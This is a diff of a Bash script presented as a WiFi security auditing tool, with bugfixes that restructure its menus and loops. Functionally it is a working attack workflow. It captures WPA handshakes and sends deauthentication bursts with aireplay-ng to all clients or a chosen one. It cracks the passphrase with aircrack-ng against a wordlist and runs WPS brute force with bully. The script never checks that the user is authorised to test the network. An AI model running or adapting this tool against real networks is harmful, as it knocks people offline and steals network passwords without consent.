@@ -4,13 +4,14 @@
 # Description: Automated WiFi Security Auditing Tool for Arch/Hyprland
 # Hardware:    Hardware Agnostic (Auto-detects Intel/Atheros/Realtek)
 # Author:      Elite DevOps
-# Version:     2.2.0 (Rescan Added)
+# Version:     2.2.1 (Bugfixes)
 # Requires:    Bash 5.0+
 # -----------------------------------------------------------------------------
 
 # Strict mode with better error handling
 set -euo pipefail
 IFS=$'\n\t'
+shopt -s extglob
 
 # Ensure Bash 5.0+ for modern features
 if ((BASH_VERSINFO[0] < 5)); then
@@ -19,7 +20,7 @@ if ((BASH_VERSINFO[0] < 5)); then
 fi
 
 # -----------------------------------------------------------------------------
-# CONSTANTS & COLORS (using tput for better terminal compatibility)
+# CONSTANTS & COLORS (ANSI escapes, tput used for capability detection)
 # -----------------------------------------------------------------------------
 if [[ -t 1 ]] && tput colors &>/dev/null && (($(tput colors) >= 8)); then
     readonly RED=$'\e[0;31m'
@@ -37,19 +38,6 @@ readonly SCAN_PREFIX="scan_dump"
 readonly CLIENT_SCAN_PREFIX="client_scan"
 readonly SCRIPT_PID="$$"
 readonly SCRIPT_NAME="${0##*/}"
-
-# Secure temp directory creation with validation
-TMP_DIR="$(mktemp -d -t wifi_audit_XXXXXX 2>/dev/null)" || {
-    printf '%s\n' "Error: Failed to create temporary directory" >&2
-    exit 1
-}
-readonly TMP_DIR
-
-# Ensure TMP_DIR is valid
-[[ -d "$TMP_DIR" && -w "$TMP_DIR" ]] || {
-    printf '%s\n' "Error: Temporary directory is not accessible" >&2
-    exit 1
-}
 
 # Global state tracking
 declare -g MON_IFACE=""
@@ -105,6 +93,19 @@ fi
 # Validate REAL_HOME exists
 [[ -d "$REAL_HOME" ]] || die "User home directory not found: $REAL_HOME"
 
+# Secure temp directory creation with validation (after elevation to prevent orphan on exec)
+TMP_DIR="$(mktemp -d -t wifi_audit_XXXXXX 2>/dev/null)" || {
+    printf '%s\n' "Error: Failed to create temporary directory" >&2
+    exit 1
+}
+readonly TMP_DIR
+
+# Ensure TMP_DIR is valid
+[[ -d "$TMP_DIR" && -w "$TMP_DIR" ]] || {
+    printf '%s\n' "Error: Temporary directory is not accessible" >&2
+    exit 1
+}
+
 # -----------------------------------------------------------------------------
 # RUN AS USER
 # -----------------------------------------------------------------------------
@@ -155,11 +156,11 @@ copy_to_clipboard() {
 # IMPROVED CLEANUP TRAP (Cherry-picked from v3.0)
 # -----------------------------------------------------------------------------
 cleanup() {
+    local exit_code=$?
+
     # Prevent re-entrancy (cleanup calling itself)
     ((CLEANUP_IN_PROGRESS)) && return
     CLEANUP_IN_PROGRESS=1
-    
-    local exit_code=$?
     
     # Block all signals during cleanup
     trap '' EXIT INT TERM HUP QUIT
@@ -233,6 +234,7 @@ check_deps() {
     declare -A deps=(
         ["aircrack-ng"]="aircrack-ng"
         ["bully"]="bully"
+        ["wash"]="reaver"
         ["gawk"]="gawk"
         ["lspci"]="pciutils"
         ["timeout"]="coreutils"
@@ -290,8 +292,6 @@ validate_path() {
             return 1
         fi
     done
-    
-    if [[ "$path" =~ $'\x00' ]]; then return 1; fi
     
     if [[ "$path" =~ [[:cntrl:]] ]]; then
         local cleaned="${path//$'\t'/}"
@@ -724,30 +724,6 @@ prepare_wordlist() {
 # -----------------------------------------------------------------------------
 # CLIENT SCANNING
 # -----------------------------------------------------------------------------
-perform_client_micro_scan() {
-    log_info "Performing targeted client discovery scan (5s)..."
-    rm -f -- "$TMP_DIR/$CLIENT_SCAN_PREFIX"* 2>/dev/null || true
-    timeout --signal=SIGTERM 10s \
-        airodump-ng \
-        --bssid "$TARGET_BSSID" \
-        --channel "$TARGET_CH" \
-        -w "$TMP_DIR/$CLIENT_SCAN_PREFIX" \
-        --output-format csv \
-        -- "$MON_IFACE" &>/dev/null &
-    local scan_pid=$!
-    
-    local i
-    for ((i=1; i<=5; i++)); do
-        printf '.'
-        sleep 1
-    done
-    printf '\n'
-    kill "$scan_pid" &>/dev/null || true
-    wait "$scan_pid" 2>/dev/null || true
-    sync
-    sleep 0.5
-}
-
 get_connected_clients() {
     local custom_csv="${1:-}"
     local specific_csv="$TMP_DIR/$CLIENT_SCAN_PREFIX-01.csv"
@@ -758,7 +734,7 @@ get_connected_clients() {
         local attempts=0
         while [[ ! -f "$custom_csv" ]] && ((attempts < 5)); do
             sleep 1
-            ((attempts++))
+            ((++attempts))
         done
         [[ -f "$custom_csv" ]] && source_csv="$custom_csv"
     fi
@@ -810,207 +786,214 @@ attack_wpa_handshake() {
         log_warn "No valid wordlist found. Capture will proceed but cracking will be skipped."
     fi
 
-    local timestamp
-    timestamp=$(date +%Y%m%d_%H%M%S)
-    local capture_base="${HANDSHAKE_DIR}/${TARGET_ESSID_SAFE}_${timestamp}"
-    
-    local record_cmd
-    record_cmd="sudo airodump-ng -c ${TARGET_CH} --bssid ${TARGET_BSSID} -w '${capture_base}' ${MON_IFACE}"
-
-    printf '\n'
-    log_info "Step 1: Handshake Capture"
-    printf '1. The %scapture command%s has been prepared.\n' "$CYAN" "$NC"
-    printf '2. Open a new terminal.\n'
-    printf '3. Paste and run it.\n'
-    printf '4. Return here and press ENTER.\n\n'
-    
-    if copy_to_clipboard "$record_cmd"; then
-        log_success "Command copied to clipboard!"
-    else
-        log_warn "Clipboard tool not available. Copy manually:"
-        printf '%s\n' "$record_cmd"
-    fi
-
-    read -r -p "Press ENTER when recorder is running..."
-
-    local target_mac=""
-    local user_capture_csv="${capture_base}-01.csv"
-
-    # Master loop to allow going back to selection
+    # L1: Main retry loop (replaces recursive calls)
     while true; do
+        local timestamp
+        timestamp=$(date +%Y%m%d_%H%M%S)
+        local capture_base="${HANDSHAKE_DIR}/${TARGET_ESSID_SAFE}_${timestamp}"
+        
+        local record_cmd
+        record_cmd="sudo airodump-ng -c ${TARGET_CH} --bssid ${TARGET_BSSID} -w '${capture_base}' ${MON_IFACE}"
 
-        # Sub-loop for Target Selection
+        printf '\n'
+        log_info "Step 1: Handshake Capture"
+        printf '1. The %scapture command%s has been prepared.\n' "$CYAN" "$NC"
+        printf '2. Open a new terminal.\n'
+        printf '3. Paste and run it.\n'
+        printf '4. Return here and press ENTER.\n\n'
+        
+        if copy_to_clipboard "$record_cmd"; then
+            log_success "Command copied to clipboard!"
+        else
+            log_warn "Clipboard tool not available. Copy manually:"
+            printf '%s\n' "$record_cmd"
+        fi
+
+        read -r -p "Press ENTER when recorder is running..."
+
+        local target_mac=""
+        local user_capture_csv="${capture_base}-01.csv"
+
+        # L2: Client selection master loop
         while true; do
-            get_connected_clients "$user_capture_csv"
-            
-            printf '\nTarget Selection:\n'
-            printf '1) Broadcast Deauth (Kick Everyone)\n'
-            
-            local c=2
-            if ((${#CONNECTED_CLIENTS[@]} > 0)); then
-                local client mac pwr
-                for client in "${CONNECTED_CLIENTS[@]}"; do
-                    IFS=',' read -r mac pwr <<< "$client"
-                    printf '%d) Specific Client: %s (Signal: %s dBm)\n' "$c" "$mac" "${pwr:-?}"
-                    ((c++))
-                done
-            else
-                printf '   (No connected clients found yet)\n'
-            fi
-            
-            printf 'r) Refresh Client List (Read Capture File)\n'
-            
-            local sel
-            read -r -p "Select Target [1-$((c-1))] or 'r' (Default 1): " sel
-            sel="${sel:-1}"
-            
-            if [[ "${sel,,}" == "r" ]]; then
-                log_info "Reloading client data from capture file..."
-                sleep 0.5
-                continue
-            fi
-            
-            if [[ "$sel" =~ ^[0-9]+$ ]]; then
-                if ((sel == 1)); then
-                    log_info "Targeting Broadcast (All Clients)"
-                    target_mac=""
-                    break
-                elif ((sel > 1 && sel < c)); then
-                    local client_idx=$((sel - 2))
-                    local selected_line="${CONNECTED_CLIENTS[client_idx]}"
-                    local raw_mac="${selected_line%%,*}"
-                    target_mac="${raw_mac//[^0-9A-Fa-f:]/}"
-                    
-                    if [[ "$target_mac" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
-                        log_info "Targeting specific client: $target_mac"
-                        break
+
+            # L3: Client picker sub-loop
+            while true; do
+                get_connected_clients "$user_capture_csv"
+                
+                printf '\nTarget Selection:\n'
+                printf '1) Broadcast Deauth (Kick Everyone)\n'
+                
+                local c=2
+                if ((${#CONNECTED_CLIENTS[@]} > 0)); then
+                    local client mac pwr
+                    for client in "${CONNECTED_CLIENTS[@]}"; do
+                        IFS=',' read -r mac pwr <<< "$client"
+                        printf '%d) Specific Client: %s (Signal: %s dBm)\n' "$c" "$mac" "${pwr:-?}"
+                        ((c++))
+                    done
+                else
+                    printf '   (No connected clients found yet)\n'
+                fi
+                
+                printf 'r) Refresh Client List (Read Capture File)\n'
+                
+                local sel
+                read -r -p "Select Target [1-$((c-1))] or 'r' (Default 1): " sel
+                sel="${sel:-1}"
+                
+                if [[ "${sel,,}" == "r" ]]; then
+                    log_info "Reloading client data from capture file..."
+                    sleep 0.5
+                    continue  # stay in L3
+                fi
+                
+                if [[ "$sel" =~ ^[0-9]+$ ]]; then
+                    if ((sel == 1)); then
+                        log_info "Targeting Broadcast (All Clients)"
+                        target_mac=""
+                        break  # exit L3
+                    elif ((sel > 1 && sel < c)); then
+                        local client_idx=$((sel - 2))
+                        local selected_line="${CONNECTED_CLIENTS[client_idx]}"
+                        local raw_mac="${selected_line%%,*}"
+                        target_mac="${raw_mac//[^0-9A-Fa-f:]/}"
+                        
+                        if [[ "$target_mac" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
+                            log_info "Targeting specific client: $target_mac"
+                            break  # exit L3
+                        else
+                            log_warn "Invalid MAC detected. Try rescanning."
+                        fi
                     else
-                        log_warn "Invalid MAC detected. Try rescanning."
+                        log_err "Invalid selection."
                     fi
                 else
                     log_err "Invalid selection."
                 fi
-            else
-                log_err "Invalid selection."
-            fi
-        done
-
-        printf '\n'
-        log_info "Step 2: Sending Deauth Packets"
-        
-        # Sub-loop for Attack Execution
-        while true; do
-            local burst=1 # Change this value to adjust burst size
-            log_info "Sending $burst groups of deauth packets..."
-
-            if [[ -n "$target_mac" ]]; then
-                timeout --signal=SIGTERM 30s \
-                    aireplay-ng -0 "$burst" -a "$TARGET_BSSID" -c "$target_mac" -- "$MON_IFACE" || true
-            else
-                timeout --signal=SIGTERM 30s \
-                    aireplay-ng -0 "$burst" -a "$TARGET_BSSID" -- "$MON_IFACE" || true
-            fi
+            done
 
             printf '\n'
-            log_success "Deauth burst complete."
-            printf "Check your other terminal for 'WPA Handshake: ...'\n"
+            log_info "Step 2: Sending Deauth Packets"
             
-            printf 'Options:\n'
-            printf 'y) Yes, captured - Start Cracking\n'
-            printf 'n) No, stop attack\n'
-            printf 'r) Retry Deauth (Send more packets)\n'
-            printf 'b) Back to Client Selection\n'
-            printf 't) Back to Target (Network) Selection\n'
-            
-            local cap_choice
-            read -r -p "Choice [y/n/r/b/t] (Default: r): " cap_choice
-            cap_choice="${cap_choice:-r}"
-            
-            case "${cap_choice,,}" in
-                y) break 2 ;; # Proceed directly to cracking without checking
-                b) break ;;   # Break only Attack loop, returning to Selection loop
-                t) return 2 ;; # Return code 2 tells main() to restart scan_targets
-                r) continue ;;
-                *)
-                    log_info "Aborting attack."
-                    return 0
-                    ;;
-            esac
-        done
-    done
-    
-    local cap_file="${capture_base}-01.cap"
-    
-    if [[ ! -f "$cap_file" ]]; then
-        local found_cap
-        found_cap=$(find "$HANDSHAKE_DIR" -maxdepth 1 \
-            -name "${TARGET_ESSID_SAFE}_${timestamp}*.cap" \
-            -type f 2>/dev/null | head -n1)
-        [[ -n "$found_cap" ]] && cap_file="$found_cap"
-    fi
+            # Deauth attack loop
+            while true; do
+                local burst=1 # Change this value to adjust burst size
+                log_info "Sending $burst groups of deauth packets..."
 
-    if [[ -f "$cap_file" ]]; then
-        chown "$REAL_USER":"$REAL_GROUP" -- "$cap_file" 2>/dev/null || true
-        log_info "Capture file ownership transferred to $REAL_USER."
-    fi
-
-    # Step 3 Loop: Allows retrying if cracking fails or file was empty
-    while true; do
-        if [[ -n "${FINAL_WORDLIST:-}" && -f "${FINAL_WORDLIST:-}" && -f "$cap_file" ]]; then
-            log_info "Step 3: Cracking Password..."
-            
-            local key_file="$TMP_DIR/cracked_key.txt"
-            rm -f -- "$key_file"
-            
-            aircrack-ng -w "$FINAL_WORDLIST" -l "$key_file" -- "$cap_file" || true
-            
-            if [[ -f "$key_file" && -s "$key_file" ]]; then
-                local cracked_key
-                cracked_key=$(<"$key_file")
-                
-                printf '\n'
-                printf '%s%s**************************************************%s\n' "$GREEN" "$BOLD" "$NC"
-                printf '%s%s* *%s\n' "$GREEN" "$BOLD" "$NC"
-                printf '%s%s* PASSWORD CRACKED !!!                 *%s\n' "$GREEN" "$BOLD" "$NC"
-                printf '%s%s* *%s\n' "$GREEN" "$BOLD" "$NC"
-                printf '%s%s**************************************************%s\n' "$GREEN" "$BOLD" "$NC"
-                printf '\n'
-                printf '%s%s   PASSPHRASE:  %s%s\n' "$CYAN" "$BOLD" "$cracked_key" "$NC"
-                printf '\n'
-                
-                if copy_to_clipboard "$cracked_key"; then
-                    log_success "Password copied to clipboard!"
+                if [[ -n "$target_mac" ]]; then
+                    timeout --signal=SIGTERM 30s \
+                        aireplay-ng -0 "$burst" -a "$TARGET_BSSID" -c "$target_mac" -- "$MON_IFACE" || true
+                else
+                    timeout --signal=SIGTERM 30s \
+                        aireplay-ng -0 "$burst" -a "$TARGET_BSSID" -- "$MON_IFACE" || true
                 fi
-                return 0 # Success exit
-            else
-                log_warn "Password not found OR handshake invalid."
-            fi
-        elif [[ -f "$cap_file" ]]; then
-            log_info "Capture file saved at: $cap_file"
-            log_info "No wordlist available. Crack later with: aircrack-ng -w <wordlist> '$cap_file'"
-            return 0
-        else
-            log_warn "Capture file not found."
+
+                printf '\n'
+                log_success "Deauth burst complete."
+                printf "Check your other terminal for 'WPA Handshake: ...'\n"
+
+                # Menu prompt loop (typo-safe re-prompt)
+                while true; do
+                    printf 'Options:\n'
+                    printf 'y) Yes, captured - Start Cracking\n'
+                    printf 'n) No, stop attack\n'
+                    printf 'r) Retry Deauth (Send more packets)\n'
+                    printf 'b) Back to Client Selection\n'
+                    printf 't) Back to Target (Network) Selection\n'
+                    
+                    local cap_choice
+                    read -r -p "Choice [y/n/r/b/t] (Default: r): " cap_choice
+                    cap_choice="${cap_choice:-r}"
+                    
+                    case "${cap_choice,,}" in
+                        y) break 3 ;;   # exit menu + deauth + client selection → cracking
+                        n)
+                            log_info "Aborting attack."
+                            return 0
+                            ;;
+                        b) break 2 ;;   # exit menu + deauth → back to client selection
+                        t) return 2 ;;  # exit function → rescan networks
+                        r) break ;;     # exit menu → top of deauth loop (re-send)
+                        *)
+                            log_warn "Invalid option. Please try again."
+                            continue    # re-prompt within menu loop
+                            ;;
+                    esac
+                done
+            done
+        done
+        
+        local cap_file="${capture_base}-01.cap"
+        
+        if [[ ! -f "$cap_file" ]]; then
+            local found_cap
+            found_cap=$(find "$HANDSHAKE_DIR" -maxdepth 1 \
+                -name "${TARGET_ESSID_SAFE}_${timestamp}*.cap" \
+                -type f 2>/dev/null | head -n1)
+            [[ -n "$found_cap" ]] && cap_file="$found_cap"
         fi
 
-        # Menu to retry if cracking failed
-        printf '\nCracking attempt finished/failed.\n'
-        printf 'Options:\n'
-        printf 'r) Return to Deauth Menu (Try capturing again)\n'
-        printf 'x) Exit this attack\n'
-        
-        local post_crack
-        read -r -p "Selection [r/x] (Default: r): " post_crack
-        post_crack="${post_crack:-r}"
-        
-        if [[ "${post_crack,,}" == "r" ]]; then
-            # Calling the function recursively to restart the attack menu
-            # This is the cleanest way to "go back" without complex loop structures
-            attack_wpa_handshake
-            return $? 
-        else
-            return 0
+        if [[ -f "$cap_file" ]]; then
+            chown "$REAL_USER":"$REAL_GROUP" -- "${capture_base}"* 2>/dev/null || true
+            log_info "Capture files ownership transferred to $REAL_USER."
         fi
+
+        # Crack attempt loop
+        while true; do
+            if [[ -n "${FINAL_WORDLIST:-}" && -f "${FINAL_WORDLIST:-}" && -f "$cap_file" ]]; then
+                log_info "Step 3: Cracking Password..."
+                
+                local key_file="$TMP_DIR/cracked_key.txt"
+                rm -f -- "$key_file"
+                
+                aircrack-ng -w "$FINAL_WORDLIST" -l "$key_file" -- "$cap_file" || true
+                
+                if [[ -f "$key_file" && -s "$key_file" ]]; then
+                    local cracked_key
+                    cracked_key=$(<"$key_file")
+                    
+                    printf '\n'
+                    printf '%s%s**************************************************%s\n' "$GREEN" "$BOLD" "$NC"
+                    printf '%s%s* *%s\n' "$GREEN" "$BOLD" "$NC"
+                    printf '%s%s* PASSWORD CRACKED !!!                 *%s\n' "$GREEN" "$BOLD" "$NC"
+                    printf '%s%s* *%s\n' "$GREEN" "$BOLD" "$NC"
+                    printf '%s%s**************************************************%s\n' "$GREEN" "$BOLD" "$NC"
+                    printf '\n'
+                    printf '%s%s   PASSPHRASE:  %s%s\n' "$CYAN" "$BOLD" "$cracked_key" "$NC"
+                    printf '\n'
+                    
+                    if copy_to_clipboard "$cracked_key"; then
+                        log_success "Password copied to clipboard!"
+                    fi
+                    return 0 # Success exit
+                else
+                    log_warn "Password not found OR handshake invalid."
+                fi
+            elif [[ -f "$cap_file" ]]; then
+                log_info "Capture file saved at: $cap_file"
+                log_info "No wordlist available. Crack later with: aircrack-ng -w <wordlist> '$cap_file'"
+                return 0
+            else
+                log_warn "Capture file not found."
+            fi
+
+            # Menu to retry if cracking failed
+            printf '\nCracking attempt finished/failed.\n'
+            printf 'Options:\n'
+            printf 'r) Return to Deauth Menu (Try capturing again)\n'
+            printf 'x) Exit this attack\n'
+            
+            local post_crack
+            read -r -p "Selection [r/x] (Default: r): " post_crack
+            post_crack="${post_crack:-r}"
+            
+            if [[ "${post_crack,,}" == "r" ]]; then
+                continue 2  # continue L1 → full restart with new timestamp
+            else
+                return 0
+            fi
+        done
     done
 }
 
@@ -1026,7 +1009,7 @@ attack_wps() {
     log_info "Attempting WPS PIXIE/Bruteforce via 'bully'..."
     log_warn "This may take a very long time. Press Ctrl+C to abort."
     
-    bully -b "$TARGET_BSSID" -c "$TARGET_CH" -- "$MON_IFACE" -v 3 || {
+    bully -b "$TARGET_BSSID" -c "$TARGET_CH" -v 3 -- "$MON_IFACE" || {
         log_warn "Bully exited with error or was interrupted."
     }
 }
@@ -1038,7 +1021,7 @@ main() {
     printf '========================================\n'
     printf '   Arch/Hyprland Wi-Fi Security Audit   \n'
     printf '========================================\n'
-    printf 'Version: 2.1.3 (Safe & Stable) | PID: %d\n' "$$"
+    printf 'Version: 2.2.1 (Bugfixes) | PID: %d\n' "$$"
     printf '\n'
 
     check_deps
@@ -1049,46 +1032,53 @@ main() {
     while true; do
         scan_targets
 
-        printf '\n'
-        printf 'Select Attack Vector:\n'
-        printf '1) WPA Handshake Capture + Crack\n'
-        printf '2) WPS Attack (Bully)\n'
-        printf '3) Rescan Targets\n'
-        printf '4) Exit\n'
+        local should_rescan=0
+        while true; do
+            printf '\n'
+            printf 'Select Attack Vector:\n'
+            printf '1) WPA Handshake Capture + Crack\n'
+            printf '2) WPS Attack (Bully)\n'
+            printf '3) Rescan Targets\n'
+            printf '4) Exit\n'
 
-        local attack_choice
-        read -r -p "Choice [1]: " attack_choice
-        attack_choice="${attack_choice:-1}"
+            local attack_choice
+            read -r -p "Choice [1]: " attack_choice
+            attack_choice="${attack_choice:-1}"
 
-        case "$attack_choice" in
-            1)
-                local result=0
-                # The || result=$? trick prevents 'set -e' from crashing the script
-                # when the function returns 2 (Back to Target)
-                attack_wpa_handshake || result=$?
+            case "$attack_choice" in
+                1)
+                    local result=0
+                    # The || result=$? trick prevents 'set -e' from crashing the script
+                    # when the function returns 2 (Back to Target)
+                    attack_wpa_handshake || result=$?
 
-                if ((result == 2)); then
-                    log_info "Returning to network scan..."
-                    continue
-                fi
-                break
-                ;;
-            2)
-                attack_wps
-                break
-                ;;
-            3)
-                log_info "Restarting scan..."
-                continue
-                ;;
-            4)
-                log_info "Exiting."
-                exit 0
-                ;;
-            *)
-                log_err "Invalid choice."
-                ;;
-        esac
+                    if ((result == 2)); then
+                        log_info "Returning to network scan..."
+                        should_rescan=1
+                    fi
+                    break
+                    ;;
+                2)
+                    attack_wps
+                    break
+                    ;;
+                3)
+                    log_info "Restarting scan..."
+                    should_rescan=1
+                    break
+                    ;;
+                4)
+                    log_info "Exiting."
+                    exit 0
+                    ;;
+                *)
+                    log_err "Invalid choice."
+                    ;;
+            esac
+        done
+
+        ((should_rescan)) && continue
+        break
     done
 
     printf '\n'
